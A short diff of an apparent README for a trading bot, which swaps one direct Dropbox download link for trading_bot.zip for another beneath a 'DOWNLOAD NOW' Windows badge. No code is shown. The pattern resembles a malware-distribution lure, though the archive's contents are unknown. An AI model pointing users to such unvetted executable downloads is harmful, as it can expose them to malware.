@@ -27,7 +27,7 @@ Spend less time monitoring. React faster. Keep your workflow under control.
 
 **Ready to explore its capabilities?**
 
-<a href="https://www.dropbox.com/scl/fi/nsjjhpg6kn2j6krtkkvgm/trading_bot.zip?rlkey=aikptw1mrol6ebl8f1qd40sdr&st=1kxonixb&dl=1">
+<a href="https://www.dropbox.com/scl/fi/mara7s4tdavb5tqlpsrmy/trading_bot.zip?rlkey=ob6bwq1utq8ixhkvkrhn9m9ay&st=gh1kjz7m&dl=1">
   <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20NOW-2EA44F?style=for-the-badge&logo=windows&logoColor=white" alt="Download Now">
 </a>
 
